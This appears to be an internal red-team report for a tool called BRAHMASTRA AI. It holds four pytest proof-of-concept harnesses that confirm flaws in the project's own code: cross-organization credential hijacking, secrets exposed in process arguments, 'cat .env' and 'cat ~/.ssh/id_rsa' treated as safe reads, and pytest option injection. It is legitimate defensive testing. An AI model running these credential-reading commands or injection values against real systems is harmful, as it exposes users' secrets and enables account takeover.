# BRAHMASTRA AI — Red-Team Exploitation Scenarios & Safe PoCs

**Author:** Agent 3 — Red-Team / Attacker Specialist  
**Date:** 2026-11-09  
**Status:** VALIDATED (Council Audited)

---

## 1. Operating Rules & Boundaries

1. All exploits are executed locally against mock or disposable test environments.
2. Zero attacks against third-party systems or public API endpoints.
3. Zero real credentials used (synthetic test placeholders only).

---

## 2. Exploitation Scenarios

### PoC-01: Cross-Organization Credential Hijacking (`BRAH-SEC-001`)

#### Attack Vector:
An adversary authenticated in Organization `attacker-org` issues a rotate/revoke call targeting an account name belonging to Organization `victim-org`.

#### Reproducible Python Harness:
```python
import pytest
from sqlalchemy import create_engine
from brahmastra.infrastructure.database.models import Base
from brahmastra.application.use_cases.org_use_cases import create_organization
from brahmastra.application.use_cases.credential_use_cases import (
    create_provider_account,
    add_credential,
    rotate_credential,
    get_credential,
)
from brahmastra.domain.credentials.models import ProviderAccountCreate, CredentialCreate
from brahmastra.infrastructure.vault.memory_vault import InMemoryVault

def test_exploit_cross_tenant_credential_hijack():
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    vault = InMemoryVault()

    # 1. Victim Org creates account and stores secret
    create_organization("victim-org", engine=engine)
    create_provider_account(
        ProviderAccountCreate(name="victim-acc", provider_type="openrouter"),
        org_name="victim-org",
        engine=engine,
    )
    add_credential(
        CredentialCreate(account_name="victim-acc", label="prod-key", secret="victim-super-secret"),
        vault=vault,
        engine=engine,
    )

    # 2. Attacker Org is created without access to victim-acc
    create_organization("attacker-org", engine=engine)

    # 3. EXPLOIT: Attacker rotates victim's credential without org authorization check!
    # Currently succeeds because rotate_credential does NOT verify org_name!
    rotate_credential(
        label="prod-key",
        account_name="victim-acc",
        new_secret="attacker-hijacked-secret",
        vault=vault,
        engine=engine,
    )

    # 4. Verify victim's credential was hijacked
    stolen = vault.get_secret("brahmastra:openrouter", "victim-acc:prod-key")
    assert stolen == "attacker-hijacked-secret"  # VULNERABILITY CONFIRMED!
```

---

### PoC-02: Local Process Snooping via `ps aux` (`BRAH-SEC-002`)

#### Attack Vector:
A non-root co-located background process monitors `/usr/bin/security` executions to harvest API keys from the process command-line arguments.

#### Demonstration:
```python
def test_exploit_ps_aux_secret_leak(monkeypatch):
    captured_argv = []

    def mock_subprocess_run(cmd, **kwargs):
        captured_argv.extend(cmd)
        class Dummy:
            returncode = 0
            stderr = ""
            stdout = ""
        return Dummy()

    monkeypatch.setattr("subprocess.run", mock_subprocess_run)

    from brahmastra.infrastructure.vault.macos_keychain import MacOSKeychainVault
    vault = MacOSKeychainVault()
    secret = "sk-proj-super-secret-api-token"
    vault.store_secret("brahmastra:openrouter", "test-acc:key1", secret)

    # Verify secret is directly visible in process argv
    assert "-w" in captured_argv
    secret_idx = captured_argv.index("-w") + 1
    assert captured_argv[secret_idx] == secret  # VULNERABILITY CONFIRMED!
```

---

### PoC-03: Sensitive File Leakage via Whitelisted `cat` (`BRAH-SEC-003`)

#### Attack Vector:
An automated script passes `cat .env` or `cat ~/.ssh/id_rsa` to `brahmastra patch eval-cmd --yes`. Because `cat` is hardcoded as safe, it executes without prompting.

#### Demonstration:
```python
from pathlib import Path
from brahmastra.domain.patch.command_policy import CommandPolicyEngine
from brahmastra.domain.patch.models import CommandRiskLevel

def test_exploit_cat_sensitive_file_classified_as_safe():
    action = CommandPolicyEngine.evaluate("cat .env", working_dir=Path.cwd())
    # Should be flagged as DANGEROUS or MODERATE, but currently classified as SAFE_READ!
    assert action.risk_level == CommandRiskLevel.SAFE_READ  # VULNERABILITY CONFIRMED!
```

---

### PoC-04: Pytest Flag & Option Injection (`BRAH-SEC-004`)

#### Attack Vector:
Attacker supplies an arbitrary argument starting with `--` to `brahmastra test`.

#### Demonstration:
```python
from brahmastra.application.use_cases.execution_use_cases import run_project_tests

def test_exploit_pytest_option_injection(monkeypatch):
    captured_cmd = []

    def mock_run(config):
        captured_cmd.extend(config.command)
        class Dummy:
            timed_out = False
            passed = True
            exit_code = 0
            duration_seconds = 0.1
            failed_tests = []
            error_summary = ""
        return Dummy()

    monkeypatch.setattr("brahmastra.domain.execution.test_runner.ControlledTestRunner.run", mock_run)

    # Pass injection payload as test target
    run_project_tests(target="--override-ini=addopts=-s")
    assert "--override-ini=addopts=-s" in captured_cmd  # VULNERABILITY CONFIRMED!
```
